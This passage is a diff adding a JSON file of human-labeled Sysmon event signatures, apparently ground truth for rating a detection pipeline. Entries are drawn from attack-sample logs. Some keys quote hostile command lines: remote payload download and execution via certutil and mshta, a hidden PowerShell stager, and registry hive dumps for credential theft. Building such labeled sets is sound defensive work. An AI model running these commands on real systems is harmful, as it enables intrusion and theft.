@@ -1,0 +1,1117 @@
+{
+  "1|netsh.exe|c:\\windows\\system32|cmd.exe|netsh i p a v l=<n> listena=<ver> connectp=<n> c=<ver>": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Defense Evasion/de_portforward_netsh_rdp_sysmon_13_1.evtx"
+    ],
+    "prefilter": "malicious",
+    "score": 4.0
+  },
+  "7|migwiz.exe|c:\\windows\\system32\\migwiz||c:\\windows\\system32\\migwiz\\cryptbase.dll": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Privilege Escalation/sysmon_1_7_11_migwiz.evtx"
+    ],
+    "prefilter": "drop",
+    "score": 4.0
+  },
+  "7|dllhost.exe|c:\\windows\\system32||c:\\windows\\system32\\cryptsp.dll": {
+    "severity": "none",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Privilege Escalation/Sysmon_UACME_64.evtx"
+    ],
+    "prefilter": "drop",
+    "score": 1.5
+  },
+  "11|spoolsv.exe|c:\\windows\\system32||c:\\windows\\system32\\spool\\drivers\\x64\\3\\new\\stdnames.gpd": {
+    "severity": "none",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Privilege Escalation/privesc_spoolsv_spl_file_write_sysmon11.evtx"
+    ],
+    "prefilter": "malicious",
+    "score": 4.5
+  },
+  "7|ieinstal.exe|c:\\program files\\internet explorer||c:\\windows\\system32\\user32.dll": {
+    "severity": "none",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Privilege Escalation/Sysmon_UACME_64.evtx"
+    ],
+    "prefilter": "drop",
+    "score": 1.5
+  },
+  "11|a.exe|<profile>\\downloads||<profile>\\appdata\\roaming\\9qxtsau9w8gypj4w\\bre6bge2jubb.exe": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Persistence/sysmon_13_1_persistence_via_winlogon_shell.evtx"
+    ],
+    "prefilter": "review",
+    "score": 1.5
+  },
+  "7|mmc.exe|c:\\windows\\system32||c:\\windows\\system32\\winmm.dll": {
+    "severity": "none",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Privilege Escalation/Sysmon_UACME_64.evtx"
+    ],
+    "prefilter": "drop",
+    "score": 1.5
+  },
+  "11|rundll32.exe|c:\\windows\\syswow64||<profile>\\appdata\\roaming\\data.enc": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "AutomatedTestingTools/Malware/rundll32_cmd_schtask.evtx"
+    ],
+    "prefilter": "malicious",
+    "score": 5.5
+  },
+  "1|psexecprivesc.exe|<profile>|powershell.exe|c:\\windows\\system32\\mspaint.exe": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Privilege Escalation/sysmon_privesc_psexec_dwell.evtx"
+    ],
+    "prefilter": "malicious",
+    "score": 7.0
+  },
+  "7|dllhost.exe|c:\\windows\\system32||c:\\windows\\system32\\combase.dll": {
+    "severity": "none",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 2,
+    "srcs": [
+      "Privilege Escalation/Sysmon_UACME_64.evtx"
+    ],
+    "prefilter": "drop",
+    "score": 1.5
+  },
+  "13|lsass.exe|c:\\windows\\system32||hklm\\sam\\sam\\domains\\account\\<profile>\\sqlsvc\\(default)": {
+    "severity": "medium",
+    "gold": "suspicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Persistence/sysmon_local_account_creation_and_added_admingroup_12_13.evtx"
+    ],
+    "prefilter": "malicious",
+    "score": 7.5
+  },
+  "7|consent.exe|c:\\windows\\system32||c:\\windows\\system32\\bcryptprimitives.dll": {
+    "severity": "none",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 4,
+    "srcs": [
+      "Privilege Escalation/Sysmon_UACME_64.evtx"
+    ],
+    "prefilter": "drop",
+    "score": 1.5
+  },
+  "7|ieinstal.exe|c:\\program files\\internet explorer||c:\\windows\\system32\\imagehlp.dll": {
+    "severity": "none",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Privilege Escalation/Sysmon_UACME_64.evtx"
+    ],
+    "prefilter": "drop",
+    "score": 1.5
+  },
+  "7|msiexec.exe|c:\\windows\\system32||c:\\windows\\system32\\vbscript.dll": {
+    "severity": "none",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Execution/Exec_sysmon_meterpreter_reversetcp_msipackage.evtx"
+    ],
+    "prefilter": "drop",
+    "score": 4.0
+  },
+  "1|i.exe|<profile>\\appdata\\local\\temp\\temp3_lync.zip|cscript.exe|": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Execution/sysmon_zipexec.evtx"
+    ],
+    "prefilter": "review",
+    "score": 3.0
+  },
+  "12|svchost.exe|c:\\windows\\system32||hku\\<sid>\\software\\microsoft\\windows\\currentversion\\run": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Lateral Movement/lm_remote_registry_sysmon_1_13_3.evtx"
+    ],
+    "prefilter": "malicious",
+    "score": 4.0
+  },
+  "1|cmd.exe|c:\\windows\\syswow64|winword.exe|cmd /c ping <ver>&&del del /f /q /a:h \"<profile>\\appdata\\roaming\\wwlib.dll\"": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "AutomatedTestingTools/Malware/sideloading_uacbypass_rundll32_injection_c2.evtx"
+    ],
+    "prefilter": "malicious",
+    "score": 4.5
+  },
+  "11|spoolsv.exe|c:\\windows\\system32||c:\\windows\\system32\\spool\\drivers\\x64\\3\\new\\stdschmx.gdl": {
+    "severity": "none",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Privilege Escalation/privesc_spoolsv_spl_file_write_sysmon11.evtx"
+    ],
+    "prefilter": "malicious",
+    "score": 4.5
+  },
+  "11|cmd.exe|c:\\windows\\system32||c:\\windows\\system32\\xxxfile.csproj": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx"
+    ],
+    "prefilter": "review",
+    "score": 1.5
+  },
+  "1|netsh.exe|c:\\windows\\system32|cmd.exe|netsh trace start capture=yes filemode=append persistent=yes tracefile=trace.etl": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx"
+    ],
+    "prefilter": "review",
+    "score": 1.5
+  },
+  "7|cmd.exe|c:\\windows\\system32||c:\\windows\\system32\\wintrust.dll": {
+    "severity": "none",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Privilege Escalation/Sysmon_UACME_64.evtx"
+    ],
+    "prefilter": "drop",
+    "score": 1.5
+  },
+  "1|mshta.exe|c:\\windows\\system32|rundll32.exe|\"c:\\programdata\\calc.hta\"": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Execution/exec_sysmon_1_11_lolbin_rundll32_openurl_FileProtocolHandler.evtx"
+    ],
+    "prefilter": "malicious",
+    "score": 9.5
+  },
+  "7|[1]consent.exe|<profile>\\appdata\\local\\temp\\idc1.tmp||c:\\windows\\system32\\bcryptprimitives.dll": {
+    "severity": "none",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Privilege Escalation/Sysmon_UACME_64.evtx"
+    ],
+    "prefilter": "review",
+    "score": 1.5
+  },
+  "1|svchost.exe|c:\\windows\\system32|services.exe|-k netsvcs -p -s gpsvc": {
+    "severity": "none",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 4,
+    "srcs": [
+      "Defense Evasion/sysmon_10_1_ppid_spoofing.evtx",
+      "Execution/revshell_cmd_svchost_sysmon_1.evtx",
+      "Privilege Escalation/PrivEsc_Imperson_NetSvc_to_Sys_Decoder_Sysmon_1_17_18.evtx",
+      "Privilege Escalation/privesc_unquoted_svc_sysmon_1_11.evtx"
+    ],
+    "prefilter": "drop",
+    "score": -1.5
+  },
+  "7|conhost.exe|c:\\windows\\system32||c:\\windows\\system32\\msvcp_win.dll": {
+    "severity": "none",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Privilege Escalation/Sysmon_UACME_64.evtx"
+    ],
+    "prefilter": "drop",
+    "score": 1.5
+  },
+  "1|cmd.exe|c:\\windows\\system32|com-hijack.exe|/c pause": {
+    "severity": "critical",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Persistence/persist_firefox_comhijack_sysmon_11_13_7_1.evtx"
+    ],
+    "prefilter": "review",
+    "score": 1.5
+  },
+  "1|bcdedit.exe|c:\\windows\\system32|cmd.exe|/set {default} bootstatuspolicy ignoreallfailures": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx"
+    ],
+    "prefilter": "review",
+    "score": 1.5
+  },
+  "1|notepad.exe|c:\\windows\\system32|cmd.exe|notepad": {
+    "severity": "none",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Persistence/persistence_SilentProcessExit_ImageHijack_sysmon_13_1.evtx"
+    ],
+    "prefilter": "malicious",
+    "score": 4.0
+  },
+  "13|services.exe|c:\\windows\\system32||hklm\\system\\currentcontrolset\\services\\psexesvc\\imagepath": {
+    "severity": "low",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Persistence/persist_valid_account_guest_rid_hijack.evtx"
+    ],
+    "prefilter": "drop",
+    "score": -1.0
+  },
+  "1|cmd.exe|c:\\windows\\system32|com-hijack.exe|/c test.bat": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Persistence/persist_firefox_comhijack_sysmon_11_13_7_1.evtx"
+    ],
+    "prefilter": "review",
+    "score": 1.5
+  },
+  "1|rundll32.exe|c:\\windows\\system32|control.exe|shell32.dll,control_rundll \"<profile>\\downloads\\invoice@<n>.cpl\",": {
+    "severity": "critical",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Execution/sysmon_1_11_rundll32_cpl_ostap.evtx"
+    ],
+    "prefilter": "malicious",
+    "score": 5.5
+  },
+  "1|svchost.exe|c:\\windows\\system32|services.exe|-k localservice -p -s eventsystem": {
+    "severity": "none",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Privilege Escalation/privesc_unquoted_svc_sysmon_1_11.evtx"
+    ],
+    "prefilter": "drop",
+    "score": -1.0
+  },
+  "7|dllhost.exe|c:\\windows\\system32||c:\\windows\\system32\\oleaut32.dll": {
+    "severity": "none",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 2,
+    "srcs": [
+      "Privilege Escalation/Sysmon_UACME_64.evtx"
+    ],
+    "prefilter": "drop",
+    "score": 1.5
+  },
+  "7|ieinstal.exe|c:\\program files\\internet explorer||c:\\windows\\system32\\ucrtbase.dll": {
+    "severity": "none",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Privilege Escalation/Sysmon_UACME_64.evtx"
+    ],
+    "prefilter": "drop",
+    "score": 1.5
+  },
+  "1|cmd.exe|c:\\windows\\system32|powershell.exe|/c \"reg save hklm\\system c:\\extract\\system_hive\"": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx"
+    ],
+    "prefilter": "review",
+    "score": 1.5
+  },
+  "1|userinit.exe|c:\\windows\\system32|winlogon.exe|": {
+    "severity": "none",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 4,
+    "srcs": [
+      "Persistence/persistence_sysmon_11_13_1_shime_appfix.evtx",
+      "Persistence/sysmon_13_1_persistence_via_winlogon_shell.evtx",
+      "Privilege Escalation/privesc_unquoted_svc_sysmon_1_11.evtx"
+    ],
+    "prefilter": "review",
+    "score": 2.5
+  },
+  "1|explorer.exe|c:\\windows|svchost.exe|/factory,{<guid>} -embedding": {
+    "severity": "none",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 2,
+    "srcs": [
+      "Execution/susp_explorer_exec.evtx",
+      "Execution/susp_explorer_exec_root_cmdline_@rimpq_@CyberRaiju.evtx"
+    ],
+    "prefilter": "review",
+    "score": 2.5
+  },
+  "1|cmd.exe|c:\\windows\\system32|cmd.exe|cmd /c certutil.exe -urlcache -split -f https://raw.githubusercontent.com/op7ic/edr-testing-script/master/payloads/cradletest.txt default_file_path2.ps1": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx"
+    ],
+    "prefilter": "malicious",
+    "score": 7.5
+  },
+  "1|wusa.exe|c:\\windows\\syswow64|uacme.exe|": {
+    "severity": "none",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 2,
+    "srcs": [
+      "Privilege Escalation/Sysmon_UACME_30.evtx"
+    ],
+    "prefilter": "malicious",
+    "score": 4.0
+  },
+  "1|cmd.exe|c:\\windows\\system32|powershell.exe|/c \"reg delete hklm\\software\\microsoft\\windows\\currentversion\\runonceex\\<n>\\depend /v 1 /f\"": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx"
+    ],
+    "prefilter": "review",
+    "score": 1.5
+  },
+  "7|rundll32.exe|c:\\windows\\system32||c:\\windows\\system32\\windowscoredeviceinfo.dll": {
+    "severity": "none",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 18,
+    "srcs": [
+      "Defense Evasion/Sysmon 7  Update Session Orchestrator Dll Hijack.evtx"
+    ],
+    "prefilter": "drop",
+    "score": 3.0
+  },
+  "1|svchost.exe|c:\\windows\\system32|services.exe|-k netsvcs -p -s winmgmt": {
+    "severity": "none",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Privilege Escalation/privesc_unquoted_svc_sysmon_1_11.evtx"
+    ],
+    "prefilter": "drop",
+    "score": -1.0
+  },
+  "1|rundll32.exe|c:\\windows\\system32|python.exe|zipfldr.dll,routethecall c:\\windows\\system32\\calc.exe": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Execution/exec_sysmon_1_11_lolbin_rundll32_zipfldr_RouteTheCall.evtx"
+    ],
+    "prefilter": "malicious",
+    "score": 7.5
+  },
+  "1|powershell.exe|c:\\windows\\system32\\windowspowershell\\v1.0|w3wp.exe|-nop -noni -enc <b64><truncated>": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx"
+    ],
+    "prefilter": "malicious",
+    "score": 12.0
+  },
+  "11|msbuild.exe|c:\\program files (x86)\\microsoft visual studio\\<n>\\community\\msbuild\\current\\bin||<profile>\\appdata\\local\\temp\\tmp19546d957b6e4d15b83f93a323d5f087.rsp": {
+    "severity": "low",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 2,
+    "srcs": [
+      "Execution/execution_evasion_visual_studio_prebuild_event.evtx"
+    ],
+    "prefilter": "malicious",
+    "score": 6.0
+  },
+  "1|cmd.exe|c:\\windows\\system32|powershell.exe|/c \"reg add \" hklm\\software\\microsoft\\windows nt\\currentversion\\image file execution \"options\\displayswitch.exe /v debugger /t reg_sz /d c:\\windows\\system32\\cmd.exe /f\"": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx"
+    ],
+    "prefilter": "review",
+    "score": 1.5
+  },
+  "1|usoclient.exe|c:\\windows\\system32|cmd.exe|usoclient startinteractivescan": {
+    "severity": "none",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Defense Evasion/Sysmon 7  Update Session Orchestrator Dll Hijack.evtx"
+    ],
+    "prefilter": "review",
+    "score": 1.5
+  },
+  "12|lsass.exe|c:\\windows\\system32||hku\\s-1-5-19\\software\\microsoft\\cryptography\\tpm\\telemetry": {
+    "severity": "none",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Lateral Movement/smbmap_upload_exec_sysmon.evtx"
+    ],
+    "prefilter": "malicious",
+    "score": 5.0
+  },
+  "3|system|||wk:445|dns": {
+    "severity": "medium",
+    "gold": "suspicious",
+    "decided_by": "human",
+    "n": 27,
+    "srcs": [
+      "Defense Evasion/DE_remote_eventlog_svc_crash_byt3bl33d3r_sysmon_17_1_3.evtx",
+      "Defense Evasion/faxhell_sysmon_7_1_18_3_bindshell_dllhijack.evtx",
+      "Discovery/discovery_sysmon_3_Invoke_UserHunter_SourceMachine.evtx",
+      "Lateral Movement/LM_impacket_docmexec_mmc_sysmon_01.evtx",
+      "Lateral Movement/LM_regsvc_DirectoryServiceExtPt_Lsass_NTDS_AdamXpn.evtx"
+    ],
+    "prefilter": "drop",
+    "score": -1.5
+  },
+  "3|system|||registered|nodns": {
+    "severity": "medium",
+    "gold": "suspicious",
+    "decided_by": "human",
+    "n": 3,
+    "srcs": [
+      "Lateral Movement/LM_impacket_docmexec_mmc_sysmon_01.evtx",
+      "Lateral Movement/LM_sysmon_psexec_smb_meterpreter.evtx",
+      "Lateral Movement/LM_wmiexec_impacket_sysmon_whoami.evtx"
+    ],
+    "prefilter": "drop",
+    "score": 0.0
+  },
+  "13|rdpwinst.exe|<profile>\\desktop\\rdpwrap-v1.6.2||hklm\\system\\currentcontrolset\\services\\termservice\\parameters\\servicedll": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Defense Evasion/sysmon_13_rdp_settings_tampering.evtx"
+    ],
+    "prefilter": "review",
+    "score": 1.5
+  },
+  "1|reg.exe|c:\\windows\\system32|cmd.exe|reg save hklm\\security security": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx"
+    ],
+    "prefilter": "review",
+    "score": 1.5
+  },
+  "13|powershell.exe|c:\\windows\\system32\\windowspowershell\\v1.0||hklm\\software\\microsoft\\powershell\\1\\shellids\\microsoft.powershell\\executionpolicy": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Defense Evasion/de_powershell_execpolicy_changed_sysmon_13.evtx"
+    ],
+    "prefilter": "malicious",
+    "score": 4.0
+  },
+  "1|whoami.exe|c:\\windows\\system32|osk.exe|whoami": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 2,
+    "srcs": [
+      "Persistence/persistence_accessibility_features_osk_sysmon1.evtx",
+      "Persistence/persistence_sysmon_11_13_1_shime_appfix.evtx"
+    ],
+    "prefilter": "review",
+    "score": 1.0
+  },
+  "13|reg.exe|c:\\windows\\system32||hku\\<sid>_classes\\folder\\shell\\open\\command\\(default)": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Privilege Escalation/Sysmon_UACME_53.evtx"
+    ],
+    "prefilter": "review",
+    "score": 1.5
+  },
+  "7|akagi64.exe|<profile>\\source\\repos\\uacme\\source\\akagi\\output\\x64\\release||c:\\windows\\system32\\cfgmgr32.dll": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Privilege Escalation/Sysmon_UACME_64.evtx"
+    ],
+    "prefilter": "drop",
+    "score": 4.0
+  },
+  "1|cmd.exe|c:\\windows\\system32|powershell.exe|/c \"bitsadmin.exe /resume atomicbits\"": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx"
+    ],
+    "prefilter": "malicious",
+    "score": 5.5
+  },
+  "7|ieinstal.exe|c:\\program files\\internet explorer||c:\\windows\\system32\\ieadvpack.dll": {
+    "severity": "none",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Privilege Escalation/Sysmon_UACME_64.evtx"
+    ],
+    "prefilter": "drop",
+    "score": 1.5
+  },
+  "11|uacbypass.exe|<profile>\\downloads||c:\\windows \\system32\\winmm.dll": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Privilege Escalation/sysmon_11_7_1_uacbypass_windirectory_mocking.evtx"
+    ],
+    "prefilter": "malicious",
+    "score": 4.0
+  },
+  "1|netstat.exe|c:\\windows\\system32|powershell.exe|-na": {
+    "severity": "none",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Lateral Movement/powercat_revShell_sysmon_1_3.evtx"
+    ],
+    "prefilter": "malicious",
+    "score": 4.0
+  },
+  "1|reg.exe|c:\\windows\\system32|cmd.exe|reg delete \" \"hkcu\\software\\microsoft\\windows\\currentversion\\run /v atomic\" red \"team /f": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx"
+    ],
+    "prefilter": "malicious",
+    "score": 4.0
+  },
+  "13|services.exe|c:\\windows\\system32||hklm\\system\\currentcontrolset\\services\\hello\\imagepath": {
+    "severity": "none",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Lateral Movement/LM_sysmon_psexec_smb_meterpreter.evtx"
+    ],
+    "prefilter": "drop",
+    "score": -1.0
+  },
+  "1|svchost.exe|c:\\windows\\system32|services.exe|-k netsvcs -p -s iphlpsvc": {
+    "severity": "none",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Privilege Escalation/privesc_unquoted_svc_sysmon_1_11.evtx"
+    ],
+    "prefilter": "drop",
+    "score": -1.0
+  },
+  "1|psexesvc.exe|c:\\windows|explorer.exe|": {
+    "severity": "none",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 2,
+    "srcs": [
+      "Persistence/persistence_sysmon_11_13_1_shime_appfix.evtx"
+    ],
+    "prefilter": "review",
+    "score": 1.5
+  },
+  "3|mshta.exe|c:\\windows\\system32||wk:80|dns": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 2,
+    "srcs": [
+      "Execution/exec_persist_rundll32_mshta_scheduledtask_sysmon_1_3_11.evtx"
+    ],
+    "prefilter": "malicious",
+    "score": 5.5
+  },
+  "7|consent.exe|c:\\windows\\system32||c:\\windows\\system32\\profapi.dll": {
+    "severity": "none",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 4,
+    "srcs": [
+      "Privilege Escalation/Sysmon_UACME_64.evtx"
+    ],
+    "prefilter": "drop",
+    "score": 1.5
+  },
+  "1|appcmd.exe|c:\\windows\\system32\\inetsrv|powershell.exe|list vdir \"error ( message:configuration error \" /text:password": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx"
+    ],
+    "prefilter": "malicious",
+    "score": 9.5
+  },
+  "13|regsvcs.exe|c:\\windows\\microsoft.net\\framework\\v4.0.<n>||hkcr\\wow6432node\\clsid\\{<guid>}\\inprocserver32\\<verdir>\\class": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx"
+    ],
+    "prefilter": "review",
+    "score": 1.5
+  },
+  "11|runtimebroker.exe|c:\\windows\\system32||<profile>\\appdata\\local\\microsoft\\abc.txt": {
+    "severity": "none",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Privilege Escalation/eop_appcontainer_il_broker_filewrite.evtx"
+    ],
+    "prefilter": "malicious",
+    "score": 4.0
+  },
+  "12|regedit.exe|c:\\windows||hku\\<sid>\\software\\microsoft\\windows\\currentversion\\explorer\\runmru": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Defense Evasion/Sysmon_12_DE_AntiForensics_MRU_DeleteKey.evtx"
+    ],
+    "prefilter": "review",
+    "score": 1.5
+  },
+  "7|sharprdp.exe|c:\\programdata\\usoshared||c:\\programdata\\usoshared\\axinterop.mstsclib.dll": {
+    "severity": "medium",
+    "gold": "suspicious",
+    "decided_by": "human",
+    "n": 2,
+    "srcs": [
+      "Lateral Movement/sharprdp_sysmon_7_mstscax.dll.evtx"
+    ],
+    "prefilter": "malicious",
+    "score": 4.0
+  },
+  "13|explorer.exe|c:\\windows||hku\\<sid>\\software\\microsoft\\windows\\currentversion\\explorer\\runmru\\d": {
+    "severity": "low",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Lateral Movement/LM_sysmon_3_12_13_1_SharpRDP.evtx"
+    ],
+    "prefilter": "review",
+    "score": 1.5
+  },
+  "7|akagi64.exe|<profile>\\source\\repos\\uacme\\source\\akagi\\output\\x64\\release||c:\\windows\\system32\\bcrypt.dll": {
+    "severity": "critical",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Privilege Escalation/Sysmon_UACME_64.evtx"
+    ],
+    "prefilter": "drop",
+    "score": 4.0
+  },
+  "11|com-hijack.exe|<profile>\\downloads||<profile>\\downloads\\test.bat": {
+    "severity": "medium",
+    "gold": "suspicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Persistence/persist_firefox_comhijack_sysmon_11_13_7_1.evtx"
+    ],
+    "prefilter": "review",
+    "score": 1.5
+  },
+  "1|rundll32.exe|c:\\windows\\system32|cmd.exe|javascript:\"\\..\\mshtml,runhtmlapplication \";document.write();h=new%20activexobject(\"wscript.shell\").run(\"mshta https://hotelesms.com/talsk.txt\",0,true);": {
+    "severity": "critical",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Execution/exec_persist_rundll32_mshta_scheduledtask_sysmon_1_3_11.evtx"
+    ],
+    "prefilter": "malicious",
+    "score": 8.0
+  },
+  "1|flash_update.exe|<profile>\\downloads|explorer.exe|": {
+    "severity": "low",
+    "gold": "benign",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "AutomatedTestingTools/Malware/DE_timestomp_and_dll_sideloading_and_RunPersist.evtx"
+    ],
+    "prefilter": "review",
+    "score": 1.5
+  },
+  "1|powershell.exe|c:\\windows\\system32\\windowspowershell\\v1.0|cmd.exe|-nop -w hidden -noni -c \"if([intptr]::size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\windowspowershell\\v1.0\\powershell.exe'};$s=new-object system.diagnostics.processstartinfo;$s.filename=$b;$s.arguments='-noni -nop -w hidden -c &([scriptblock]::create((new-object io.streamreader(new-": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Lateral Movement/LM_sysmon_psexec_smb_meterpreter.evtx"
+    ],
+    "prefilter": "malicious",
+    "score": 6.5
+  },
+  "1|cmd.exe|c:\\windows\\system32|powershell.exe|/c \"reg add \" \"hkcu\\software\\microsoft\\windows\\currentversion\\run /v atomic\" red \"team /t reg_sz /f /d c:\\path\\atomicredteam.exe\"": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx"
+    ],
+    "prefilter": "malicious",
+    "score": 4.0
+  },
+  "3|powershell.exe|c:\\windows\\system32\\windowspowershell\\v1.0||registered|nodns": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
+      "Lateral Movement/powercat_revShell_sysmon_1_3.evtx"
+    ],
+    "prefilter": "malicious",
+    "score": 4.0
+  },
+  "3|<unknown process>|||low|nodns": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 2,
+    "srcs": [
+      "Lateral Movement/ImpersonateUser-via local Pass The Hash Sysmon and Security.evtx"
+    ],
+    "prefilter": "review",
+    "score": 1.5
+  },
+  "1|cmd.exe|c:\\windows\\system32|cmd.exe|cmd /c c:\\windows\\microsoft.net\\framework64\\v2.0.<n>\\regasm.exe /u allthethings.dll": {
+    "severity": "high",
+    "gold": "malicious",
+    "decided_by": "human",
+    "n": 1,
+    "srcs": [
